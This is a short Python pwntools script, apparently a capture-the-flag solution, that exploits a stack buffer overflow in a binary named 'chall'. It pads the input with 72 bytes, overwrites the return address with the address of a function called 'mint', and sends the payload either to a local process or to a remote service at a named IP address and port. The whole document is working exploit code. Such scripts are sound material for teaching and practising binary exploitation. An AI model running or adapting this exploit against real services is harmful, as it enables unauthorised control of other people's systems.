from pwn import *

elf = ELF('./chall')
context.binary = elf

if args.REMOTE:
    r = remote("40.82.147.253", 1337)
else:
    r = process('./chall')

payload  = b"A" * 72
payload += p64(elf.symbols["mint"])

r.recvuntil(b'id: ')
r.sendline(payload)

r.interactive()
